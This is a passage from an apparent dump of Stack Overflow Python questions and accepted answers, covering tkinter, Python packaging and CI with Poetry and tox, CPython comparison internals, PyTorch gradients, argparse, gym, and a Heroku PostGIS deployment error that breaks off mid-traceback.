    "AcceptedAnswer": "Based on my own relentless testing and other answers here, I managed to get to a solution.\nimport tkinter as tk\nfrom tkinter import messagebox  # https://stackoverflow.com/a/29780454/12349101\n\nroot = tk.Tk()\n\nmain_text = tk.Text(root)\n\nbox_text = tk.Text(root, height=1, width=10)\nbox_text.pack()\n\ntxt = \"\"\"hello world\"\"\"\n\nlen_txt = len(\n    txt)  # get the total length of the text content. Can be replaced by `os.path.getsize` or other alternatives for files\n\nmain_text.insert(tk.INSERT, txt)\n\n\ndef offset():\n    inputValue = box_text.get(\"1.0\",\n                              \"end-1c\")  # get the input of the text widget without newline (since it's added by default)\n\n    # focusing the other text widget, deleting and re-insert the original text so that the selection/tag is updated (no need to move the mouse to the other widget in this example)\n    main_text.focus()\n    main_text.delete(\"1.0\", tk.END)\n    main_text.insert(tk.INSERT, txt)\n\n\n    to_do = inputValue.split(\"-\")\n\n    if len(to_do) == 1:  # if length is 1, it probably is a single offset for a single byte/char\n        to_do.append(to_do[0])\n\n    if not to_do[0].isdigit() or not to_do[1].isdigit():  # Only integers are supported\n        messagebox.showerror(\"error\", \"Only integers are supported\")\n        return  # trick to prevent the failing range to be executed\n\n    if int(to_do[0]) > len_txt or int(to_do[1]) > len_txt:  # total length is the maximum range\n        messagebox.showerror(\"error\",\n                             \"One of the integers in the range seems to be bigger than the total length\")\n        return  # trick to prevent the failing range to be executed\n\n    if to_do[0] == \"0\" or to_do[1] == \"0\":  # since we don't use a 0 index, this isn't needed\n        messagebox.showerror(\"error\", \"Using zero in this range isn't useful\")\n        return  # trick to prevent the failing range to be executed\n\n    if int(to_do[0]) > int(to_do[1]):  # This is to support reverse range offset, so 11-2 -> 2-11, etc\n        first = int(to_do[1]) - 1\n        first = str(first).split(\"-\")[-1:][0]\n\n        second = (int(to_do[0]) - len_txt) - 1\n        second = str(second).split(\"-\")[-1:][0]\n    else:  # use the offset range normally\n        first = int(to_do[0]) - 1\n        first = str(first).split(\"-\")[-1:][0]\n\n        second = (int(to_do[1]) - len_txt) - 1\n        second = str(second).split(\"-\")[-1:][0]\n\n    print(first, second)\n    main_text.tag_add(\"sel\", '1.0 + {}c'.format(first), 'end - {}c'.format(second))\n\n\nbuttonCommit = tk.Button(root, text=\"use offset\",\n                         command=offset)\nbuttonCommit.pack()\nmain_text.pack(fill=\"both\", expand=1)\nmain_text.pack_propagate(0)\nroot.mainloop()\n\nNow the above works, as described in the \"hello world\" example in my post. It isn't a 1:1 clone/emulation of f.tell() or f.seek(), but I feel like it's close.\nThe above does not use text.delete but instead select the text, so it's visually less confusing (at least to me).\nIt works with the following offset type:\n\nreverse range: 11-2 -> 2-11 so the order does not matter\nnormal range: 2-11, 1-8, 8-10...\nsingle offset: 10 or 10-10 so it can support single char/byte\n\nNow the main thing I noticed, is that '1.0 + {}c', 'end - {}c' where {} is the range, works by omitting its given range.\nIf you were to use 1-3 as a range on the string hello world it would select ello wor. You could say it omitted h and ld\\n, with the added newline by Tkinter (which we ignore in the code above unless it's part of the total length variable). The correct offset (or at least the one following the example I gave in the post above) would be 2-9.\nP.S: For this example, clicking on the button after entering the offsets range is needed.\n"
}
{
    "Id": 73257839,
    "PostTypeId": 1,
    "Title": "'setup.py install is deprecated' warning shows up every time I open a terminal in VSCode",
    "Body": "Every time I boot up terminal on VSCode, I get the following prompt. This does not happen on Terminal.app.\n    /usr/local/lib/python3.9/site-packages/setuptools/command/install.py:34:\nSetuptoolsDeprecationWarning: setup.py install is deprecated. Use build and pip\nand other standards-based tools.\n\nHow do I resolve this?\n",
    "AcceptedAnswerId": 73273307,
    "AcceptedAnswer": "Install the setuptools 58.2.0 version using the following command\npip install setuptools==58.2.0\n\n"
}
{
    "Id": 73157383,
    "PostTypeId": 1,
    "Title": "How do you create a fully-fledged Python package?",
    "Body": "When creating a Python package, you can simply write the code, build the package, and share it on PyPI. But how do you do that?\n\nHow do you create a Python package?\nHow do you publish it?\n\nAnd then, what if you want to go further?\n\nHow do you set up CI/CD for it?\nHow do you test it and check code coverage?\nHow do you lint it?\nHow do you automate everything you can?\n\n",
    "AcceptedAnswerId": 73157490,
    "AcceptedAnswer": "Preamble\nWhen you've published dozens of packages, you know how to answer these questions in ways that suit your workflow(s) and taste. But answering these questions for the first time can be quite difficult, time consuming, and frustrating!\nThat's why I spent days researching ways of doing these things, which I then published as a blog article called How to create a Python package in 2022.\nThat article, and this answer, document my findings for when I wanted to publish my package extendedjson\nOverview\nHere is an overview of some tools you can use and the steps you can take, in the order I followed them while discovering all of this.\nDisclaimer: other alternative tools exist (usually) & most of the steps here are not mandatory.\n\nUse Poetry for dependency management\nUse GitHub to host the code\nUse pre-commit to ensure committed code is linted & formatted well\nUse Test PyPI to test uploading your package (which will make it installable with pip)\nUse Scriv for changelog management\nUpload to the real PyPI\nUse pytest to test your Python code\nUse tox to automate linting, formatting, and testing across Python versions\n\nblack\nisort\npylint\nflake8 with mccabe\n\n\nAdd code coverage with coverage.py\nSet up CI/CD with GitHub Actions\n\nrun linters and tests\ntrigger automatically on pull requests and commits\nintegrate with Codecov for coverage reports\npublish to PyPI automatically\n\n\nAdd cool README badges\nTidy up a bit\n\nset tox to use pre-commit\nremove duplicate work between tox and pre-commit hooks\nremove some redundancy in CI/CD\n\n\n\nSteps\nHere is an overview of the things you can do and more or less how to do it. Again, thorough instructions plus the rationale of why I picked certain tools, methods, etc, can be found in the reference article.\n\nUse Poetry for dependency management.\n\npoetry init initialises a project in a directory or poetry new dirname creates a new directory structure for you\ndo poetry install to install all your dependencies\npoetry add packagename can be used to add packagename as a dependency, use -D if it's a development dependency (i.e., you need it while developing the package, but the package users won't need it. For example, black is a nice example of a development dependency)\n\n\nSet up a repository on GitHub to host your code.\n\nSet up pre-commit hooks to ensure your code is always properly formatted and it passes linting. This goes on .pre-commit-config.yaml. E.g., the YAML below checks TOML and YAML files, ensures all files end with a newline, makes sure the end-of-line marker is consistent across all files, and then runs black and isort on your code.\n\n\n# See https://pre-commit.com for more information\n# See https://pre-commit.com/hooks.html for more hooks\nrepos:\n\u00a0 - repo: https://github.com/pre-commit/pre-commit-hooks\n\u00a0 \u00a0 rev: v4.0.1\n\u00a0 \u00a0 hooks:\n\u00a0 \u00a0 \u00a0 - id: check-toml\n\u00a0 \u00a0 \u00a0 - id: check-yaml\n\u00a0 \u00a0 \u00a0 - id: end-of-file-fixer\n\u00a0 \u00a0 \u00a0 - id: mixed-line-ending\n\u00a0 - repo: https://github.com/psf/black\n\u00a0 \u00a0 rev: 22.3.0\n\u00a0 \u00a0 hooks:\n\u00a0 \u00a0 \u00a0 - id: black\n\u00a0 - repo: https://github.com/PyCQA/isort\n\u00a0 \u00a0 rev: 5.10.1\n\u00a0 \u00a0 hooks:\n\u00a0 \u00a0 \u00a0 - id: isort\n\u00a0 \u00a0 \u00a0 \u00a0 args: [\"--profile\", \"black\"]\n\n\nConfigure Poetry to use the Test PyPI to make sure you can publish a package and it is downloadable & installable.\n\nTell Poetry about Test PyPI with poetry config repositories.testpypi https://test.pypi.org/legacy/\nLog in to Test PyPI, get an API token, and tell Poetry to use it with poetry config http-basic.testpypi __token__ pypi-your-api-token-here (the __token__ is a literal and shouldn't be replaced, your token goes after that).\nBuild poetry build and upload your package poetry publish -r testpypi\n\n\nManage your CHANGELOG with Scriv\n\nrun scriv create before any substantial commit and edit the file that pops up\nrun scriv collect before any release to collect all fragments into one changelog\n\n\nConfigure Poetry to use PyPI\n\nlogin to PyPI and get an API token\ntell Poetry about it with poetry config pypi-token.pypi pypi-your-token-here\nbuild & publish your package in one fell swoop with poetry publish --build\n\n\nDo a victory lap: try pip install yourpackagename to make sure everything is going great ;)\n\nPublish a GH release that matches what you uploaded to PyPI\n\nWrite tests. There are many options out there. Pytest is simple, versatile, and not too verbose.\n\nwrite tests in a directory tests/\nstart test files with test_...\nactual tests are functions with a name starting with test_...\nuse assertions (assert) to check for things (tests fail when asserting something Falsy); notice sometimes you don't even need to import pytest in your test files; e.g.:\n\n\n\n# In tests/test_basic_example.py\n\ndef this_test_would_definitely_fail():\n\u00a0 \u00a0 assert 5 > 10\n\ndef this_test_would_definitely_pass():\n\u00a0 \u00a0 assert 5 > 0\n\n\nrun tests with the command pytest\n\nAutomate testing, linting, and formatting, with tox.\n\ntox creates virtual environments for separate Python versions and can run essentially what you tell it to. Configuration goes in tox.ini. You can also embed it in the file pyproject.toml, but as of writing this, that's only supported if you add a string that actually represents the .ini configuration, which is ugly. Example tox.ini:\n\n\n\n[tox]\nisolated_build = True\nenvlist = py38,py39,py310\n\n[testenv]\ndeps =\n\u00a0 \u00a0 black\n\u00a0 \u00a0 pytest\ncommands =\n\u00a0 \u00a0 black --check extendedjson\n\u00a0 \u00a0 pytest .\n\nThe environments py38 to py310 are automatically understood by tox to represent different Python versions (you guess which ones). The header [testenv] defines configurations for all those environments that tox knows about. We install the dependencies listed in deps = ... and then run the commands listed in commands = ....\n\nrun tox with tox for all environments or tox -e py39 to pick a specific environment\n\nAdd code coverage with coverage.py\n\nrun tests and check coverage with coverage run --source=yourpackage --branch -m pytest .\ncreate a nice HTML report with coverage html\nadd this to tox\n\n\nCreate a GitHub action that runs linting and testing on commits and pull requests\n\nGH Actions are just YAML files in .github/workflows\nthis example GH action runs tox on multiple Python versions\n\n\n\n# .github/workflows/build.yaml\nname: Your amazing CI name\n\n# Run automatically on...\non:\n\u00a0 push: \u00a0# pushes...\n\u00a0 \u00a0 branches: [ main ] \u00a0# to the main branch... and\n\u00a0 pull_request: \u00a0# on pull requests...\n\u00a0 \u00a0 branches: [ main ] \u00a0# against the main branch.\n\n# What jobs does this workflow run?\njobs:\n\u00a0 build: \u00a0# There's a job called \u201cbuild\u201d which\n\u00a0 \u00a0 runs-on: ubuntu-latest \u00a0# runs on an Ubuntu machine\n\u00a0 \u00a0 strategy:\n\u00a0 \u00a0 \u00a0 matrix: \u00a0# that goes through\n\u00a0 \u00a0 \u00a0 \u00a0 python-version: [\"3.8\", \"3.9\", \"3.10\"] \u00a0# these Python versions.\n\n\u00a0 \u00a0 steps: \u00a0# The job \u201cbuild\u201d has multiple steps:\n\u00a0 \u00a0 \u00a0 - name: Checkout sources\n\u00a0 \u00a0 \u00a0 \u00a0 uses: actions/checkout@v2 \u00a0# Checkout the repository into the runner,\n\n\u00a0 \u00a0 \u00a0 - name: Setup Python\n\u00a0 \u00a0 \u00a0 \u00a0 uses: actions/setup-python@v2 \u00a0# then set up Python,\n\u00a0 \u00a0 \u00a0 \u00a0 with:\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 python-version: ${{ matrix.python-version }} \u00a0# with the version that is currently \u201cselected\u201d...\n\n\u00a0 \u00a0 \u00a0 - name: Install dependencies\n\u00a0 \u00a0 \u00a0 \u00a0 run: | \u00a0# Then run these commands\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 python -m pip install --upgrade pip\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 python -m pip install tox tox-gh-actions \u00a0# install two dependencies...\n\n\u00a0 \u00a0 \u00a0 - name: Run tox\n\u00a0 \u00a0 \u00a0 \u00a0 run: tox \u00a0# and finally run tox.\n\nNotice that, above, we installed tox and a plugin called tox-gh-actions.\nThis plugin will make tox aware of the Python version that is set up in the GH action runner, which will allow us to specify which environments tox will run in that case.\nWe just need to set a correspondence in the file tox.ini:\n# tox.ini\n# ...\n[gh-actions]\npython =\n\u00a0 \u00a0 3.8: py38\n\u00a0 \u00a0 3.9: py39\n\u00a0 \u00a0 3.10: py310\n\n\nIntegrate with Codecov for nice coverage reports in the pull requests.\n\nlog in to Codecov with GitHub and give permissions\nadd Codecov's action to the YAML from before after tox runs (it's tox that generates the local coverage report data) and add/change a coverage command to generate an xml report (it's a format that Codecov understands)\n\n\n\n# ...\n\u00a0 \u00a0 \u00a0 - name: Upload coverage to Codecov\n\u00a0 \u00a0 \u00a0 \u00a0 uses: codecov/codecov-action@v2\n\u00a0 \u00a0 \u00a0 \u00a0 with:\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 fail_ci_if_error: true\n\n\nAdd a GH Action to publish to PyPI automatically\n\njust set up a YAML file that does your manual steps of building and publishing with Poetry when a new release is made\ncreate a PyPI token to be used by GitHub\nadd it as a secret in your repository\nconfigure Poetry in the action to use that secret\n\n\n\nname: Publish to PyPI\n\non:\n\u00a0 release:\n\u00a0 \u00a0 types: [ published ]\n\u00a0 \u00a0 branches: [ main ]\n\u00a0 workflow_dispatch:\n\njobs:\n\u00a0 build-and-publish:\n\u00a0 \u00a0 runs-on: ubuntu-latest\n\n\u00a0 \u00a0 steps:\n\u00a0 \u00a0 \u00a0 # Checkout and set up Python\n\n\u00a0 \u00a0 \u00a0 - name: Install poetry and dependencies\n\u00a0 \u00a0 \u00a0 \u00a0 run: |\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 python -m pip install --upgrade pip\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 python -m pip install poetry\n\n\u00a0 \u00a0 \u00a0 - name: Configure poetry\n\u00a0 \u00a0 \u00a0 \u00a0 env:\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 pypi_token: ${{ secrets.PyPI_TOKEN }} \u00a0# You set this manually as a secret in your repository\n\u00a0 \u00a0 \u00a0 \u00a0 run: poetry config pypi-token.pypi $pypi_token\n\n\u00a0 \u00a0 \u00a0 - name: Build and publish\n\u00a0 \u00a0 \u00a0 \u00a0 run: poetry publish --build\n\n\nAdd cool badges to your README file like\n\n\n\n\n\n\nTidy up a bit\n\nrun linting through tox on pre-commit to deduplicate effort and run your preferred versions of the linters/formatters/...\nseparate linting/formatting from testing in tox as a separate environment\ncheck coverage only once as a separate tox environment\n\n\n\n"
}
{
    "Id": 74743233,
    "PostTypeId": 1,
    "Title": "What happens \"behind the scenes\" if I call `None == x` in Python?",
    "Body": "I am learning and playing around with Python and I came up with the following test code (please be aware that I would not write productive code like that, but when learning new languages I like to play around with the language's corner cases):\na = None    \nprint(None == a) # I expected True, I got True\n\nb = 1\nprint(None == b) # I expected False, I got False\n\nclass MyNone:\n    # Called if I compare some myMyNone == somethingElse\n    def __eq__(self, __o: object) -> bool:\n        return True\n\nc = MyNone()\nprint (None == c) # !!! I expected False, I got True !!!\n\nPlease see the very last line of the code example.\nHow can it be that None == something, where something is clearly not None, return True? I would have expected that result for something == None, but not for None == something.\nI expected that it would call None is something behind the scenes.\nSo I think the question boils down to: How does the __eq__ method of the None singleton object look like and how could I have found that out?\n\nPS: I am aware of PEP-0008 and its quote\n\nComparisons to singletons like None should always be done with is or is not, never the equality operators.\n\nbut I still would like to know why print (None == c) in the above example returns True.\n",
    "AcceptedAnswerId": 74743523,
    "AcceptedAnswer": "In fact, None's type does not have its own __eq__ method; within Python we can see that it apparently inherits from the base class object:\n>>> type(None).__eq__\n\n\nBut this is not really what's going on in the source code. The implementation of None can be found in Objects/object.c in the CPython source, where we see:\nPyTypeObject _PyNone_Type = {\n    PyVarObject_HEAD_INIT(&PyType_Type, 0)\n    \"NoneType\",\n    0,\n    0,\n    none_dealloc,       /*tp_dealloc*/ /*never called*/\n    0,                  /*tp_vectorcall_offset*/\n    0,                  /*tp_getattr*/\n    0,                  /*tp_setattr*/\n    // ...\n    0,                  /*tp_richcompare */\n    // ...\n    0,                  /*tp_init */\n    0,                  /*tp_alloc */\n    none_new,           /*tp_new */\n};\n\nI omitted most of the irrelevant parts. The important thing here is that _PyNone_Type's tp_richcompare is 0, i.e. a null pointer. This is checked for in the do_richcompare function:\n    if ((f = Py_TYPE(v)->tp_richcompare) != NULL) {\n        res = (*f)(v, w, op);\n        if (res != Py_NotImplemented)\n            return res;\n        Py_DECREF(res);\n    }\n    if (!checked_reverse_op && (f = Py_TYPE(w)->tp_richcompare) != NULL) {\n        res = (*f)(w, v, _Py_SwappedOp[op]);\n        if (res != Py_NotImplemented)\n            return res;\n        Py_DECREF(res);\n    }\n\nTranslating for those who don't speak C:\n\nIf the left-hand-side's tp_richcompare function is not null, call it, and if its result is not NotImplemented then return that result.\nOtherwise if the reverse hasn't already been checked*, and the right-hand-side's tp_richcompare function is not null, call it, and if the result is not NotImplemented then return that result.\n\nThere are some other branches in the code, to fall back to in case none of those branches returns a result. But these two branches are enough to see what's going on. It's not that type(None).__eq__ returns NotImplemented, rather the type doesn't have the corresponding function in the C source code at all. That means the second branch is taken, hence the result you observe.\n*The flag checked_reverse_op is set if the reverse direction has already been checked; this happens if the right-hand-side is a strict subtype of the left-hand-side, in which case it takes priority. That doesn't apply in this case since there is no subtype relation between type(None) and your class.\n"
}
{
    "Id": 73698041,
    "PostTypeId": 1,
    "Title": "How retain_grad() in pytorch works? I found its position changes the grad result",
    "Body": "in a simple test in pytorch, I want to see grad in a non-leaf tensor, so I use retain_grad():\nimport torch\na = torch.tensor([1.], requires_grad=True)\ny = torch.zeros((10))\ngt = torch.zeros((10))\n\ny[0] = a\ny[1] = y[0] * 2\ny.retain_grad()\n\nloss = torch.sum((y-gt) ** 2)\nloss.backward()\nprint(y.grad)\n\nit gives me a normal output:\ntensor([2., 4., 0., 0., 0., 0., 0., 0., 0., 0.])\n\nbut when I use retain grad() before y[1] and after y[0] is assigned:\nimport torch\na = torch.tensor([1.], requires_grad=True)\ny = torch.zeros((10))\ngt = torch.zeros((10))\n\ny[0] = a\ny.retain_grad()\ny[1] = y[0] * 2\n\nloss = torch.sum((y-gt) ** 2)\nloss.backward()\nprint(y.grad)\n\nnow the output changes to:\ntensor([10.,  0.,  0.,  0.,  0.,  0.,  0.,  0.,  0.,  0.])\n\nI can't understand the result at all.\n",
    "AcceptedAnswerId": 73701220,
    "AcceptedAnswer": "Okay so what's going on is really weird.\nWhat .retain_grad() essentially does is convert any non-leaf tensor into a leaf tensor, such that it contains a .grad attribute (since by default, pytorch computes gradients to leaf tensors only).\nHence, in your first example, after calling y.retain_grad(), it basically converted y into a leaf tensor with an accessible .grad attribute.\nHowever, in your second example, you initially converted the entire y tensor into a leaf tensor; then, you created a non-leaf tensor (y[1]) within your leaf tensor (y), which is what caused the confusion.\ny = torch.zeros((10))  # y is a non-leaf tensor\n\ny[0] = a  # y[0] is a non-leaf tensor\ny.retain_grad()  # y is a leaf tensor (including y[1])\ny[1] = y[0] * 2  # y[1] is a non-leaf tensor, BUT y[0], y[2], y[3], ..., y[9] are all leaf tensors!\n\nThe confusing part is:\ny[1] after calling y.retain_grad() is now a leaf tensor with a .grad attribute. However, y[1] after the computation (y[1] = y[0] * 2) is now not a leaf tensor with a .grad attribute; it is now treated as a new non-leaf variable/tensor.\nTherefore, when calling loss.backward(), the Chain rule of the loss w.r.t y, and particularly looking at the Chain rule of the loss w.r.t leaf y[1] now looks something like this:\n\n\n"
}
{
    "Id": 73326570,
    "PostTypeId": 1,
    "Title": "Why is the float * int multiplication faster than int * float in CPython?",
    "Body": "Basically, the expression 0.4 * a is consistently, and surprisingly, significantly faster than a * 0.4. a being an integer. And I have no idea why.\nI speculated that it is a case of a LOAD_CONST LOAD_FAST bytecode pair being \"more specialized\" than the LOAD_FAST LOAD_CONST and I would be entirely satisfied with this explanation, except that this quirk seems to apply only to multiplications where types of multiplied variables differ. (By the way, I can no longer find the link to this \"bytecode instruction pair popularity ranking\" I once found on github, does anyone have a link?)\nAnyway, here are the micro benchmarks:\n$ python3.10 -m pyperf timeit -s\"a = 9\" \"a * 0.4\"\nMean +- std dev: 34.2 ns +- 0.2 ns\n\n$ python3.10 -m pyperf timeit -s\"a = 9\" \"0.4 * a\"\nMean +- std dev: 30.8 ns +- 0.1 ns\n\n$ python3.10 -m pyperf timeit -s\"a = 0.4\" \"a * 9\"\nMean +- std dev: 30.3 ns +- 0.3 ns\n\n$ python3.10 -m pyperf timeit -s\"a = 0.4\" \"9 * a\"\nMean +- std dev: 33.6 ns +- 0.3 ns\n\nAs you can see - in the runs where the float comes first (2nd and 3rd) - it is faster.\nSo my question is where does this behavior come from? I'm 90% sure that it is an implementation detail of CPython, but I'm not that familiar with low level instructions to state that for sure.\n",
    "AcceptedAnswerId": 73326827,
    "AcceptedAnswer": "It's CPython's implementation of the BINARY_MULTIPLY opcode. It has no idea what the types are at compile-time, so everything has to be figured out at run-time. Regardless of what a and b may be, BINARY_MULTIPLY ends up inoking a.__mul__(b).\nWhen a is of int type int.__mul__(a, b) has no idea what to do unless b is also of int type. It returns Py_RETURN_NOTIMPLEMENTED (an internal C constant). This is in longobject.c's CHECK_BINOP macro. The interpreter sess that, and effectively says \"OK, a.__mul__ has no idea what to do, so let's give b.__rmul__ a shot at it\". None of that is free - it all takes time.\nfloat.__mul__(b, a) (same as float.__rmul__) does know what to do with an int (converts it to float first), so that succeeds.\nBut when a is of float type to begin with, we go to float.__mul__ first, and that's the end of it. No time burned figuring out that the int type doesn't know what to do.\nThe actual code is quite a bit more involved than the above pretends, but that's the gist of it.\n"
}
{
    "Id": 73353608,
    "PostTypeId": 1,
    "Title": "Why does argparse not accept \"--\" as argument?",
    "Body": "My script takes -d, --delimiter as argument:\nparser.add_argument('-d', '--delimiter')\n\nbut when I pass it -- as delimiter, it is empty\nscript.py --delimiter='--' \n\nI know -- is special in argument/parameter parsing, but I am using it in the form --option='--' and quoted.\nWhy does it not work?\nI am using Python 3.7.3\nHere is test code:\n#!/bin/python3\n\nimport argparse\n\nparser = argparse.ArgumentParser()\nparser.add_argument('--delimiter')\nparser.add_argument('pattern')\n\nargs = parser.parse_args()\n\nprint(args.delimiter)\n\nWhen I run it as script --delimiter=-- AAA it prints empty args.delimiter.\n",
    "AcceptedAnswerId": 73354266,
    "AcceptedAnswer": "This looks like a bug. You should report it.\nThis code in argparse.py is the start of _get_values, one of the primary helper functions for parsing values:\nif action.nargs not in [PARSER, REMAINDER]:\n    try:\n        arg_strings.remove('--')\n    except ValueError:\n        pass\n\nThe code receives the -- argument as the single element of a list ['--']. It tries to remove '--' from the list, because when using -- as an end-of-options marker, the '--' string will end up in arg_strings for one of the _get_values calls. However, when '--' is the actual argument value, the code still removes it anyway, so arg_strings ends up being an empty list instead of a single-element list.\nThe code then goes through an else-if chain for handling different kinds of argument (branch bodies omitted to save space here):\n# optional argument produces a default when not present\nif not arg_strings and action.nargs == OPTIONAL:\n    ...\n# when nargs='*' on a positional, if there were no command-line\n# args, use the default if it is anything other than None\nelif (not arg_strings and action.nargs == ZERO_OR_MORE and\n      not action.option_strings):\n    ...\n# single argument or optional argument produces a single value\nelif len(arg_strings) == 1 and action.nargs in [None, OPTIONAL]:\n    ...\n# REMAINDER arguments convert all values, checking none\nelif action.nargs == REMAINDER:\n    ...\n# PARSER arguments convert all values, but check only the first\nelif action.nargs == PARSER:\n    ...\n# SUPPRESS argument does not put anything in the namespace\nelif action.nargs == SUPPRESS:\n    ...\n# all other types of nargs produce a list\nelse:\n    ...\n\nThis code should go through the 3rd branch,\n# single argument or optional argument produces a single value\nelif len(arg_strings) == 1 and action.nargs in [None, OPTIONAL]:\n\nbut because the argument is missing from arg_strings, len(arg_strings) is 0. It instead hits the final case, which is supposed to handle a completely different kind of argument. That branch ends up returning an empty list instead of the '--' string that should have been returned, which is why args.delimiter ends up being an empty list instead of a '--' string.\n\nThis bug manifests with positional arguments too. For example,\nimport argparse\n\nparser = argparse.ArgumentParser()\nparser.add_argument('a')\nparser.add_argument('b')\n\nargs = parser.parse_args([\"--\", \"--\", \"--\"])\n\nprint(args)\n\nprints\nNamespace(a='--', b=[])\n\nbecause when _get_values handles the b argument, it receives ['--'] as arg_strings and removes the '--'. When handling the a argument, it receives ['--', '--'], representing one end-of-options marker and one actual -- argument value, and it successfully removes the end-of-options marker, but when handling b, it removes the actual argument value.\n"
}
{
    "Id": 73195438,
    "PostTypeId": 1,
    "Title": "OpenAI GYM's env.step(): what are the values?",
    "Body": "I am getting to know OpenAI's GYM (0.25.1) using Python3.10 with gym's environment set to 'FrozenLake-v1 (code below).\nAccording to the documentation, calling env.step() should return a tuple containing 4 values (observation, reward, done, info). However, when running my code accordingly, I get a ValueError:\nProblematic code:\nobservation, reward, done, info = env.step(new_action)\n\nError:\n      3 new_action = env.action_space.sample()\n----> 5 observation, reward, done, info = env.step(new_action)\n      7 # here's a look at what we get back\n      8 print(f\"observation: {observation}, reward: {reward}, done: {done}, info: {info}\")\n\nValueError: too many values to unpack (expected 4)\n\nAdding one more variable fixes the error:\na, b, c, d, e = env.step(new_action)\nprint(a, b, c, d, e)\n\nOutput:\n5 0 True True {'prob': 1.0}\n\nMy interpretation:\n\n5 should be observation\n0 is reward\nprob: 1.0 is info\nOne of the True's is done\n\nSo what's the leftover boolean standing for?\nThank you for your help!\n\nComplete code:\nimport gym\n\nenv = gym.make('FrozenLake-v1', new_step_api=True, render_mode='ansi') # build environment\n\ncurrent_obs = env.reset() # start new episode\n\nfor e in env.render():\n    print(e)\n    \nnew_action = env.action_space.sample() # random action\n\nobservation, reward, done, info = env.step(new_action) # perform action, ValueError!\n\nfor e in env.render():\n    print(e)\n\n",
    "AcceptedAnswerId": 73195616,
    "AcceptedAnswer": "From the code's docstrings:\n\n       Returns:\n           observation (object): this will be an element of the environment's :attr:`observation_space`.\n               This may, for instance, be a numpy array containing the positions and velocities of certain objects.\n           reward (float): The amount of reward returned as a result of taking the action.\n           terminated (bool): whether a `terminal state` (as defined under the MDP of the task) is reached.\n               In this case further step() calls could return undefined results.\n           truncated (bool): whether a truncation condition outside the scope of the MDP is satisfied.\n               Typically a timelimit, but could also be used to indicate agent physically going out of bounds.\n               Can be used to end the episode prematurely before a `terminal state` is reached.\n           info (dictionary): `info` contains auxiliary diagnostic information (helpful for debugging, learning, and logging).\n               This might, for instance, contain: metrics that describe the agent's performance state, variables that are\n               hidden from observations, or individual reward terms that are combined to produce the total reward.\n               It also can contain information that distinguishes truncation and termination, however this is deprecated in favour\n               of returning two booleans, and will be removed in a future version.\n           (deprecated)\n           done (bool): A boolean value for if the episode has ended, in which case further :meth:`step` calls will return undefined results.\n               A done signal may be emitted for different reasons: >Maybe the task underlying the environment was solved successfully,\n               a certain timelimit was exceeded, or the physics >simulation has entered an invalid state.\n\n\nIt appears that the first boolean represents a terminated value, i.e. \"whether a terminal state (as defined under the MDP of the task) is reached. In this case further step() calls could return undefined results.\"\nIt appears that the second represents whether the value has been truncated, i.e. did your agent go out of bounds or not? From the docstring:\n\n\"whether a truncation condition outside the scope of the MDP is satisfied. Typically a timelimit, but could also be used to indicate agent physically going out of bounds. Can be used to end the episode prematurely before a terminal state is reached.\"\n\n"
}
{
    "Id": 73206939,
    "PostTypeId": 1,
    "Title": "Heroku postgres postgis - django releases fail with: relation \"spatial_ref_sys\" does not exist",
    "Body": "Heroku changed their PostgreSQL extension schema management on 01 August 2022. (https://devcenter.heroku.com/changelog-items/2446)\nSince then every deployment to Heroku of our existing django 4.0 application fails during the release phase, the build succeeds.\nHas anyone experienced the same issue?\nIs there a workaround to push new release to Heroku except reinstalling the postgis extension?\nIf I understand the changes right, Heroku added a schema called \"heroku_ext\" for newly created extensions. As the extension is existing in our case, it should not be affected.\n\nAll currently installed extensions will continue to work as intended.\n\nFollowing the full logs of an release via git push:\ngit push staging develop:master\nGesamt 0 (Delta 0), Wiederverwendet 0 (Delta 0), Pack wiederverwendet 0\nremote: Compressing source files... done.\nremote: Building source:\nremote: \nremote: -----> Building on the Heroku-20 stack\nremote: -----> Using buildpacks:\nremote:        1. https://github.com/heroku/heroku-geo-buildpack.git\nremote:        2. heroku/python\nremote: -----> Geo Packages (GDAL/GEOS/PROJ) app detected\nremote: -----> Installing GDAL-2.4.0\nremote: -----> Installing GEOS-3.7.2\nremote: -----> Installing PROJ-5.2.0\nremote: -----> Python app detected\nremote: -----> Using Python version specified in runtime.txt\nremote: -----> No change in requirements detected, installing from cache\nremote: -----> Using cached install of python-3.9.13\nremote: -----> Installing pip 22.1.2, setuptools 60.10.0 and wheel 0.37.1\nremote: -----> Installing SQLite3\nremote: -----> Installing requirements with pip\nremote: -----> Skipping Django collectstatic since the env var DISABLE_COLLECTSTATIC is set.\nremote: -----> Discovering process types\nremote:        Procfile declares types -> release, web, worker\nremote: \nremote: -----> Compressing...\nremote:        Done: 156.1M\nremote: -----> Launching...\nremote:  !     Release command declared: this new release will not be available until the command succeeds.\nremote:        Released v123\nremote:        https://myherokuapp.herokuapp.com/ deployed to Heroku\nremote: \nremote: This app is using the Heroku-20 stack, however a newer stack is available.\nremote: To upgrade to Heroku-22, see:\nremote: https://devcenter.heroku.com/articles/upgrading-to-the-latest-stack\nremote: \nremote: Verifying deploy... done.\nremote: Running release command...\nremote: \nremote: Traceback (most recent call last):\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/db/backends/utils.py\", line 87, in _execute\nremote:     return self.cursor.execute(sql)\nremote: psycopg2.errors.UndefinedTable: relation \"spatial_ref_sys\" does not exist\nremote: \nremote: \nremote: The above exception was the direct cause of the following exception:\nremote: \nremote: Traceback (most recent call last):\nremote:   File \"/app/manage.py\", line 22, in \nremote:     main()\nremote:   File \"/app/manage.py\", line 18, in main\nremote:     execute_from_command_line(sys.argv)\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/core/management/__init__.py\", line 446, in execute_from_command_line\nremote:     utility.execute()\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/core/management/__init__.py\", line 440, in execute\nremote:     self.fetch_command(subcommand).run_from_argv(self.argv)\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/core/management/base.py\", line 414, in run_from_argv\nremote:     self.execute(*args, **cmd_options)\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/core/management/base.py\", line 460, in execute\nremote:     output = self.handle(*args, **options)\nremote:   File \"/app/.heroku/python/lib/python3.9/site-packages/django/core/management/base.py\", line 98, in 